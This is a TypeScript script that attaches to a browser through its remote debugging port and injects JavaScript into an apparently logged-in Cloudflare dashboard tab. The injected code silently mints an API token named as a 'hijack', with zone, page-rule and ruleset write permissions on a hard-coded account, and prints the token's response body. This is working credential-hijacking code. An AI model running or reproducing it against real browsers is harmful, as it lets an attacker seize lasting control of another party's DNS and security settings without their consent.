import { Effect, Console } from "effect";
import { Rdp } from "./rdp.ts";
const port = Number(process.argv[2]);
const ACC = "2d5e60dbc717af626a1eb04177aa2225";
const main = Effect.gen(function* () {
  const rdp = yield* Rdp.connect(port);
  yield* Console.log(`[mint] tab: ${rdp.tabUrl}`);
  const name = `kappa-cf-hijack-${new Date().toISOString().replace(/[-:TZ]/g,"").slice(0,14)}`;
  const body = {
    name,
    policies: [{
      effect: "allow",
      resources: { [`com.cloudflare.api.account.${ACC}`]: "*" },
      permission_groups: [
        { id: "c8fed203ed3043cba015a93ad1616f1f" }, // Zone Read
        { id: "e6d2666161e84845a636613608cee8d5" }, // Zone Write
        { id: "3030687196b94b638145a3953da2b699" }, // Zone Settings Write
        { id: "b415b70a4fd1412886f164451f20405c" }, // Page Rules Read
        { id: "ed07f6c337da4195b4e72a1fb2c6bcae" }, // Page Rules Write
        { id: "56907406c3d548ed902070ec4df0e328" }, // Account Rulesets Write
        { id: "fb39996ee9044d2a8725921e02744b39" }, // Account Rulesets Read
      ],
    }],
  };
  const postJs = `(function(){try{var x=new XMLHttpRequest();x.open('POST','/api/v4/user/tokens',false);x.setRequestHeader('Content-Type','application/json');x.send(${JSON.stringify(JSON.stringify(body))});window.__OUT=x.status+'|'+x.responseText;return 'ok';}catch(e){window.__OUT='0|XHR-ERR:'+String(e);return 'ok';}})()`;
  yield* rdp.evalSync(postJs, 25);
  yield* Effect.sleep("500 millis");
  const g = yield* rdp.evalSync("(function(){return window.__OUT;})()", 25);
  let text = "";
  if (typeof g === "string") text = g;
  else if (g && typeof g === "object" && (g as any).type === "longString") text = yield* rdp.readLongString(g as any);
  const pipe = text.indexOf("|");
  const status = pipe > 0 ? text.slice(0, pipe) : "?";
  const body2 = pipe > 0 ? text.slice(pipe+1) : text;
  yield* Console.log(`[mint] status ${status}`);
  yield* Console.log(`[mint] body: ${body2.slice(0, 800)}`);
  rdp.close();
});
Effect.runPromise(main).catch(e => { console.error("FATAL", e); process.exit(1); });
